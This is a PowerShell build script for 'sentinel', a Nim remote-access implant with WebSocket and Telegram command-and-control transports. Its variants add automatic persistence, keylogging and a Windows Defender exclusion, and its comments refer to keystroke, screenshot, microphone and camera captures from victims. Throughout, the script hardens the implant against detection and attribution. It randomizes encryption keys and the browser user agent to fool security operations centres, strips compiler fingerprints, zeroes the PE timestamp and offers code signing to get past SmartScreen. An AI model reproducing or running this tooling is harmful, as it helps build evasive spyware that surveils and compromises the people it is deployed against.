# =============================================================================
# build_sentinel.ps1 - build the sentinel super-agent
#
# sentinel.nim combines agent.nim + agent_hardened.nim + agent_telegram.nim
# into a single file. Transport is selected at compile time:
#   -d:c2_ws    WebSocket only (default, smallest IAT)
#   -d:c2_tg    Telegram only (uses WinHTTP, no OpenSSL needed)
#   -d:c2_both  WebSocket + Telegram out-of-band notifications
#
# Variants (orthogonal to transport):
#   silent       default, smallest surface
#   engagement   auto-persist on first connect
#   aggressive   auto-persist + auto-keylog + Defender exclusion
#
# Examples:
#   .\build_sentinel.ps1                       # ws, silent
#   .\build_sentinel.ps1 -Tg                   # telegram, silent
#   .\build_sentinel.ps1 -Both -Variant engagement
#   .\build_sentinel.ps1 -Tg -BotToken 123:ABC -ChatId -100123
#   .\build_sentinel.ps1 -PinCertPath C:\c2\c2.crt   # enable TLS pinning
#
# Build artifacts (all gitignored, all wiped on each run):
#   build/                final exe + bundled OpenSSL DLLs (for -Both)
#   xorkey.nim            32-byte stream-cipher key, per-build
#   prefix.nim            3-char BuildPrefix, per-build (was: "X7K" literal)
#   secret.nim            operator passphrase for S_AGENT_SECRET, per-build
#
# Source-leak reductions vs. previous version:
#   - BuildPrefix randomized per build (was literal "X7K" in 25+ places)
#   - S_AGENT_SECRET passphrase is operator-supplied or 256-bit random
#     (was a literal engagement passphrase)
#   - --build-id=none suppresses GCC build-id in PE
#   - -fno-ident suppresses GCC version banner in .comment sections
#   - post-build step zeros the PE timestamp (was: current time)
# =============================================================================

[CmdletBinding()]
param(
    [switch]$Tg          = $false,   # -Tg -> -d:c2_tg
    [switch]$Both        = $false,   # -Both -> -d:c2_both
    [ValidateSet('silent','engagement','aggressive')]
    [string]$Variant     = 'silent',
    [string]$BotToken    = "",       # Telegram bot token (only used with -Tg / -Both)
    [string]$ChatId      = "",       # Telegram chat id
    [string]$PinCertPath = "",       # Path to PEM cert for TLS pinning (ws/both only)
    [string]$Out         = "",       # Override output exe name (default: sentinel_<mode>_<variant>.exe)
    [string]$Passphrase  = ""        # Override S_AGENT_SECRET (else: random 256-bit hex)
)

$ErrorActionPreference = 'Stop'
$env:NIM = if ($env:NIM) { $env:NIM } else { "D:\appdata\nim-2.2.10\bin\nim.exe" }

function Write-Utf8NoBom {
    param(
        [Parameter(Mandatory = $true)][string]$Path,
        [Parameter(Mandatory = $true)][AllowEmptyString()][string]$Content
    )
    [System.IO.File]::WriteAllText($Path, $Content, (New-Object System.Text.UTF8Encoding($false)))
}

# ---- pick transport ----
if ($Both) { $TransportFlag = "c2_both" }
elseif ($Tg) { $TransportFlag = "c2_tg" }
else { $TransportFlag = "c2_ws" }
$TransportName = $TransportFlag.Substring(3)   # ws / tg / both
$OutputName = if ($Out) { $Out } else { "sentinel_${TransportName}_${Variant}.exe" }
$OutputPath = "build\$OutputName"

# ---- build dir + nuke previous ----
New-Item -ItemType Directory -Force -Path build | Out-Null
# Refuse to build over a running agent - a locked exe means the
# compile "succeeds" but the stale binary silently stays in place.
Get-Process -Name 'sentinel_tg_*', 'agent_telegram*' -ErrorAction SilentlyContinue |
    ForEach-Object { Write-Error "Agent process $($_.Id) ($($_.Name)) is still running - stop it before building."; exit 1 }
Get-ChildItem -Path build -Filter 'sentinel_*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction Stop
if ($Tg -or $Both) {
    # Clean up the old telegram build artifacts
    Get-ChildItem -Path build -Filter 'agent_telegram*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}
foreach ($transient in @('xorkey.nim', 'prefix.nim', 'secret.nim', 'telegram_creds.nim', 'pin.nim')) {
    Remove-Item -LiteralPath $transient -Force -ErrorAction SilentlyContinue
}

try {
# Use OS CSPRNG for all per-build entropy - Get-Random is MT19937
# and has too little internal state for anything that ends up baked
# into the binary. Cryptographic keys must come from System.Security.
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

# ---- xorkey.nim: 32-byte stream cipher key ----
$keyBytes = New-Object byte[] 32
$rng.GetBytes($keyBytes)
$key = ($keyBytes | ForEach-Object { '{0:x2}' -f $_ }) -join ''
$xorkeyContent = "const XorKey: array[32, byte] = [byte 0x$($key.Substring(0,2)),"
for ($i = 1; $i -lt 32; $i++) {
    $xorkeyContent += " 0x$($key.Substring($i*2, 2)),"
}
$xorkeyContent += "]`n"
Write-Utf8NoBom -Path "xorkey.nim" -Content $xorkeyContent

# ---- prefix.nim: 3-char BuildPrefix + randomized Chrome UA, per build ----
# The previous literal "X7K" was a free cross-sample clustering key -
# every keystroke log, screenshot, mic capture, and camera frame on
# every victim started with the same 3 characters. Generated fresh
# per build from CSPRNG; alphabet excludes 0/O/1/l/I for log-readability.
#
# Also writes a randomized UserAgent into the same file. The previous
# "Mozilla/5.0 ... Chrome/126.0.0.0 ..." UA was a static fingerprint -
# every outbound request had the same Chrome 126 UA even when the
# actual TLS client was WinHTTP (JA3/JA4 mismatch detectable by SOCs).
# We pick a version in the Chrome 124..130 range, randomized patch/build
# numbers, so each deployment looks like a different Chrome instance
# while still being internally consistent (every request from one
# binary has the same UA - real browsers behave that way).
$prefixBytes = New-Object byte[] 3
$rng.GetBytes($prefixBytes)
$prefixChars = 'ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789'
$prefix = -join ($prefixBytes | ForEach-Object { $prefixChars[$_ % $prefixChars.Length] })
# Chrome version derived from fresh CSPRNG bytes (not the prefixBytes,
# so an analyst correlating prefix + UA doesn't reduce entropy).
$uaBytes = New-Object byte[] 4
$rng.GetBytes($uaBytes)
$uaMajor = 124 + ($uaBytes[0] % 7)             # 124..130 (current release range)
$uaPatch = $uaBytes[1]                         # 0..255
$uaBuild = ($uaBytes[2] * 256) + $uaBytes[3]   # 0..65535
$uaVersion = "$uaMajor.0.$uaPatch.$uaBuild"
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$uaVersion Safari/537.36"
$prefixContent = "const BuildPrefix* = `"$prefix`"`n" +
                "const UserAgent* = `"$userAgent`"`n"
Write-Utf8NoBom -Path "prefix.nim" -Content $prefixContent

# ---- secret.nim: S_AGENT_SECRET passphrase ----
# Priority: -Passphrase arg > $env:C2_AGENT_PASSPHRASE > random 256-bit hex.
# The previous baked engagement passphrase was replaced with generated input.
# was both (a) dictionary words containing the project name + fiscal
# quarter (an attribution nail if the obfuscation ever broke) and
# (b) the only ciphertext whose plaintext was recoverable. The
# 256-bit random fallback has more entropy than any human-memorable
# phrase and ships no project fingerprint.
if ($Passphrase -eq "" -and $env:C2_AGENT_PASSPHRASE -ne $null -and $env:C2_AGENT_PASSPHRASE -ne "") {
    $Passphrase = $env:C2_AGENT_PASSPHRASE
}
if ($Passphrase -eq "") {
    $secretBytes = New-Object byte[] 32
    $rng.GetBytes($secretBytes)
    $Passphrase = -join ($secretBytes | ForEach-Object { '{0:x2}' -f $_ })
}
# Escape any backslashes or double-quotes in the operator-supplied passphrase
$escapedPassphrase = $Passphrase.Replace('\', '\\').Replace('"', '\"')
$secretContent = "const SECRET_PLAINTEXT* = `"$escapedPassphrase`"`n"
Write-Utf8NoBom -Path "secret.nim" -Content $secretContent
$tgTokenEscaped = $BotToken.Replace('\', '\\').Replace('"', '\"')
$tgChatEscaped = $ChatId.Replace('\', '\\').Replace('"', '\"')
$telegramCredsContent = "const TelegramBotToken* = `"$tgTokenEscaped`"`nconst TelegramChatId* = `"$tgChatEscaped`"`n"
Write-Utf8NoBom -Path "telegram_creds.nim" -Content $telegramCredsContent
Write-Host "[sentinel] BuildPrefix=$Prefix" -ForegroundColor DarkGray
Write-Host "[sentinel] Passphrase fingerprint: $($Passphrase.Substring(0, [Math]::Min(8, $Passphrase.Length)))... ($($Passphrase.Length) chars)" -ForegroundColor DarkGray

# ---- TLS pin (optional) ----
# When -PinCertPath is provided, generate pin.nim that wraps the cert
# in a const. Nim's `staticRead` reads the file at compile time and
# bakes the bytes into the binary.
if ($PinCertPath -and (Test-Path $PinCertPath)) {
    $escaped = $PinCertPath.Replace('\', '\\')
    Write-Utf8NoBom -Path "pin.nim" -Content ("const PINNED_CERT_PEM* = staticRead(`"" + $escaped + "`")`n")
} else {
    Write-Utf8NoBom -Path "pin.nim" -Content ""
}

# ---- build flags ----
# --passC:"-fno-ident"  suppress the GCC version banner that's
#                       normally embedded once per .o file in the
#                       .comment section (was "GCC: (GNU) 13.x.y"
#                       appearing 62 times in the PE).
# --passL:"-Wl,--build-id=none"  stop GCC from injecting a build-id
#                       section into the PE (default: 20-byte sha1).
# --passL:-s            strip symbols (existing).
$flags = @(
    "-d:release"
    "--opt:size"
    "--app:gui"
    "--path:common"
    "--passL:-s"
    "--passC:-fno-ident"
    "--passL:-Wl,--build-id=none"
    "-d:$TransportFlag"
    "-d:variant_$Variant"
)
if ($PinCertPath -and (Test-Path $PinCertPath)) {
    $flags += "-d:ssl"
    $flags += "-d:tls_pin"
}

# Telegram transport uses Windows native WinHTTP (no OpenSSL needed).
# The winhttp.dll is in the system, so no extra DLLs to bundle.
$linkerFlags = ""
if ($Tg -or $Both) {
    # No extra flags - WinHTTP is a Windows system DLL
}

$NimArgs = @("c") + $flags
if ($linkerFlags) {
    $NimArgs += @($linkerFlags -split '\s+' | Where-Object { $_ })
}
$NimArgs += @("--out:$OutputPath", "sentinel.nim")
$buildStartedAt = Get-Date
Write-Host "[sentinel] building $OutputName ..." -ForegroundColor Cyan
Write-Host "[sentinel] $env:NIM $($NimArgs -join ' ')"
# Nim writes progress dots/hints to stderr; with redirected stderr
# and EAP=Stop that surfaces as a terminating NativeCommandError,
# so relax it around the compiler call (same as build_hardened.ps1).
$prevEAP = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    & $env:NIM @NimArgs
    $compileExit = $LASTEXITCODE
    $ErrorActionPreference = $prevEAP
    if ($compileExit -ne 0) {
        throw "Nim build failed with exit code $compileExit"
    }

    # ---- post-build: copy OpenSSL DLLs for WebSocket transports ----
    # Pure -Tg reaches api.telegram.org through WinHTTP; WS and pinning
    # builds can require the OpenSSL runtime.
    if ($Both -or ($PinCertPath -and (Test-Path $PinCertPath))) {
        $opensslDir = "C:\appdata\OpenSSL-Win64\bin"  # adjust if your OpenSSL install differs
        if (-not (Test-Path $opensslDir)) {
            # Try a Nimble-installed location
            $nimbleDir = "$env:USERPROFILE\.nimble\pkgs\openssl-1.2.4\bin"
            if (Test-Path $nimbleDir) { $opensslDir = $nimbleDir }
        }
        $dlls = @("libssl-1_1-x64.dll", "libcrypto-1_1-x64.dll")
        $dllsFound = 0
        foreach ($dll in $dlls) {
            $src = Join-Path $opensslDir $dll
            if (Test-Path $src) {
                Copy-Item -Path $src -Destination "build\" -Force
                Write-Host "[sentinel] bundled $dll" -ForegroundColor Green
                $dllsFound++
            }
        }
        if ($dllsFound -eq 0) {
            Write-Host "[sentinel] WARN: no OpenSSL DLLs found - SSL-capable variants may fail to start" -ForegroundColor Yellow
            Write-Host "[sentinel]   look in: $opensslDir" -ForegroundColor Yellow
        }
    }

    # ---- post-build: zero the PE timestamp ----
    # The linker's default behavior is to stamp the PE header with the
    # current Unix time. That timestamp survives strip / --build-id=none
    # and gives an analyst a free build-time fingerprint. Zero it.
    # The IMAGE_FILE_HEADER.TimeDateStamp field is a 32-bit value at
    # PE+8 (PE\0\0 + 4 bytes of FILE_HEADER signature).
    if (Test-Path $OutputPath) {
        $peBytes = [System.IO.File]::ReadAllBytes($OutputPath)
        $peIdx = -1
        # Find "PE\0\0" signature. Scan a reasonable window.
        $scanLimit = [Math]::Min($peBytes.Length - 4, 4096)
        for ($i = 0; $i -lt $scanLimit; $i++) {
            if ($peBytes[$i] -eq 0x50 -and $peBytes[$i+1] -eq 0x45 -and `
                $peBytes[$i+2] -eq 0x00 -and $peBytes[$i+3] -eq 0x00) {
                $peIdx = $i
                break
            }
        }
        if ($peIdx -gt 0 -and ($peIdx + 12) -le $peBytes.Length) {
            # TimeDateStamp at PE+8 = 4 bytes; zero them.
            $peBytes[$peIdx + 8]  = 0
            $peBytes[$peIdx + 9]  = 0
            $peBytes[$peIdx + 10] = 0
            $peBytes[$peIdx + 11] = 0
            [System.IO.File]::WriteAllBytes($OutputPath, $peBytes)
            Write-Host "[sentinel] zeroed PE timestamp" -ForegroundColor DarkGray
        } else {
            Write-Host "[sentinel] WARN: PE signature not found, timestamp not zeroed" -ForegroundColor Yellow
        }
    }

    # ---- optional: Authenticode signing (SmartScreen) ----
    # Unsigned binaries get a SmartScreen reputation warning on first
    # run no matter how clean the rest of the build is. Opt in with:
    #   $env:C2_SIGN_CERT_PATH      path to the .pfx
    #   $env:C2_SIGN_CERT_PASSWORD  pfx password (optional)
    # Without C2_SIGN_CERT_PATH this block is a no-op, so lab builds
    # keep working unchanged.
    #
    # Order matters: the PE timestamp is zeroed ABOVE, and signing is
    # done AFTER that. Editing the PE header once a signature exists
    # invalidates it (signtool rewrites the checksum + cert table).
    if ($env:C2_SIGN_CERT_PATH) {
        if (-not (Test-Path $env:C2_SIGN_CERT_PATH)) {
            Write-Host "[sentinel] FAIL: C2_SIGN_CERT_PATH not found: $env:C2_SIGN_CERT_PATH" -ForegroundColor Red
            exit 3
        }
        $signtool = $null
        $cmdSig = Get-Command signtool.exe -ErrorAction SilentlyContinue
        if ($cmdSig) { $signtool = $cmdSig.Source }
        if (-not $signtool) {
            # Windows SDK layout: <kits>\bin\<version>\x64\signtool.exe
            foreach ($root in @("${env:ProgramFiles(x86)}\Windows Kits\10\bin", "$env:ProgramFiles\Windows Kits\10\bin")) {
                if ($signtool) { break }
                if (-not (Test-Path $root)) { continue }
                $versions = @(Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue |
                              Sort-Object Name -Descending)
                foreach ($v in $versions) {
                    foreach ($arch in @('x64', 'x86')) {
                        $cand = Join-Path $v.FullName "$arch\signtool.exe"
                        if (Test-Path $cand) { $signtool = $cand; break }
                    }
                    if ($signtool) { break }
                }
            }
        }
        if (-not $signtool) {
            Write-Host "[sentinel] FAIL: C2_SIGN_CERT_PATH is set but signtool.exe was not found" -ForegroundColor Red
            Write-Host "[sentinel]   install the Windows SDK, or unset C2_SIGN_CERT_PATH" -ForegroundColor Red
            exit 3
        }
        $signArgs = @('sign', '/fd', 'SHA256', '/tr', 'http://timestamp.digicert.com',
                      '/td', 'sha256', '/f', $env:C2_SIGN_CERT_PATH)
        if ($env:C2_SIGN_CERT_PASSWORD) {
            $signArgs += @('/p', $env:C2_SIGN_CERT_PASSWORD)
        }
        $signArgs += $OutputPath
        Write-Host "[sentinel] signing $OutputPath ..." -ForegroundColor Cyan
        & $signtool @signArgs
        if ($LASTEXITCODE -ne 0) {
            Write-Host "[sentinel] FAIL: signtool sign exited $LASTEXITCODE" -ForegroundColor Red
            Write-Host "[sentinel]   binary is built but UNSIGNED: $OutputPath" -ForegroundColor Red
            exit 3
        }
        # /pa = standard Authenticode policy (the check SmartScreen and
        # Explorer run). Failing here means we would ship a broken
        # signature, so treat it as a hard error like the audit gate.
        & $signtool verify /pa $OutputPath
        if ($LASTEXITCODE -ne 0) {
            Write-Host "[sentinel] FAIL: signature verification failed" -ForegroundColor Red
            exit 3
        }
        Write-Host "[sentinel] signed + verified" -ForegroundColor Green
    } else {
        Write-Host "[sentinel] signing skipped (C2_SIGN_CERT_PATH not set)" -ForegroundColor DarkGray
    }
} finally {
    # ---- cleanup transient files (always, even on failed compile) ----
    Remove-Item -Path xorkey.nim -ErrorAction SilentlyContinue
    Remove-Item -Path prefix.nim -ErrorAction SilentlyContinue
    Remove-Item -Path secret.nim -ErrorAction SilentlyContinue
    Remove-Item -Path telegram_creds.nim -ErrorAction SilentlyContinue
    Remove-Item -Path pin.nim -ErrorAction SilentlyContinue
}

# The exe must be NEWER than the moment the compile started - a stale
# file that survived cleanup would otherwise pass a bare Test-Path.
if ((Test-Path $OutputPath) -and (Get-Item $OutputPath).LastWriteTime -gt $buildStartedAt) {
    $size = (Get-Item $OutputPath).Length
    Write-Host "[sentinel] OK: $OutputPath ($([math]::Round($size/1024)) KB)" -ForegroundColor Green

    # ---- post-build audit: fail if any of the 8 known plaintext leaks
    # are present in the binary. audit_strings.py prints which pattern
    # matched. Use --strict so the script exits non-zero on any leak.
    $auditScript = Join-Path $PSScriptRoot "tests\audit_strings.py"
    if (Test-Path $auditScript) {
        Write-Host "[sentinel] running plaintext audit on $OutputPath ..." -ForegroundColor DarkGray
        $auditOut = & python $auditScript --strict $OutputPath 2>&1
        $auditExit = $LASTEXITCODE
        if ($auditExit -ne 0) {
            Write-Host "[sentinel] AUDIT FAIL: plaintext leaks detected" -ForegroundColor Red
            Write-Host $auditOut
            Write-Host "[sentinel] fix the leak (see tests/audit_strings.py for the pattern list)," -ForegroundColor Red
            Write-Host "[sentinel] then rebuild. Build artifacts NOT deleted so you can inspect:" -ForegroundColor Red
            Write-Host "[sentinel]   $OutputPath" -ForegroundColor Red
            exit 2
        }
        Write-Host "[sentinel] audit OK (no plaintext leaks)" -ForegroundColor DarkGray
    } else {
        Write-Host "[sentinel] WARN: tests/audit_strings.py not found, skipping audit" -ForegroundColor Yellow
    }
} else {
    Write-Host "[sentinel] FAIL: $OutputPath not produced (or stale)" -ForegroundColor Red
    exit 1
}
